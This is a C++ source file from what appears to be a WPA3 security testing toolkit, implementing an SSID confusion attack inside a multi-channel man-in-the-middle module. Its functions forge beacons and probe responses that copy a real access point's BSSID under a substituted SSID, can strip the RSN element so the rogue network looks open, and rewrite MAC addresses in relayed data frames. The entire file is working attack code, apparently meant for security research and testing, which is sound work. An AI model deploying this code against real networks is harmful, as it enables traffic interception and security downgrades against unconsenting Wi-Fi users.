#include "attacks/mc_mitm/client_state.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;

void SsidConfusion::translate_data_mac(vector<uint8_t>& raw,
							   const HWAddress<6>& from_bssid,
							   const HWAddress<6>& to_bssid, const bool change_sa) {
	if(raw.size() < 24) return;

	const uint16_t rt_len = static_cast<uint16_t>(raw[2]) |
						   (static_cast<uint16_t>(raw[3]) << 8);

	if(raw.size() < static_cast<size_t>(rt_len) + 16 + 6) return;

	uint8_t* addr1 = raw.data() + rt_len + 4;
	uint8_t* addr2 = raw.data() + rt_len + 10;  // SA
	uint8_t* addr3 = raw.data() + rt_len + 16;

	if(equal(from_bssid.begin(), from_bssid.end(), addr1))
		ranges::copy(to_bssid, addr1);

	if(change_sa && equal(from_bssid.begin(), from_bssid.end(), addr2))
		ranges::copy(to_bssid, addr2);

	if(equal(from_bssid.begin(), from_bssid.end(), addr3))
		ranges::copy(to_bssid, addr3);
}

unique_ptr<Dot11Beacon> SsidConfusion::make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid, const bool strip_rsn) {
	// BSSID kept identical to real AP
	auto b = Dot11Beacon(real.addr1(), real.addr2());
	b.addr3(real.addr3());
	b.timestamp(real.timestamp());
	b.interval(real.interval());
	b.capabilities() = real.capabilities();

	for(const auto &opt: real.options()) {
		if(opt.option() == Dot11::SSID) {
			b.add_option({ Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
		} else if(strip_rsn && opt.option() == Dot11::RSN) {
			continue; // drop RSN IE - rogue beacon appears as an open network
		} else {
			b.add_option(opt);
		}
	}
	return std::make_unique<Dot11Beacon>(std::move(b));
}

Dot11ProbeResponse SsidConfusion::make_confused_probe_resp(
	const Dot11ProbeResponse &real, const string &confused_ssid, const bool strip_rsn) {
	auto resp = Dot11ProbeResponse(real.addr1(), real.addr2());
	resp.addr3(real.addr3());
	resp.timestamp(real.timestamp());
	resp.interval(real.interval());
	resp.capabilities() = real.capabilities();

	for(const auto &opt: real.options()) {
		if(opt.option() == Dot11::SSID) {
			resp.add_option({ Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
		} else if(strip_rsn && opt.option() == Dot11::RSN) {
			continue;
		} else {
			resp.add_option(opt);
		}
	}
	return resp;
}
}
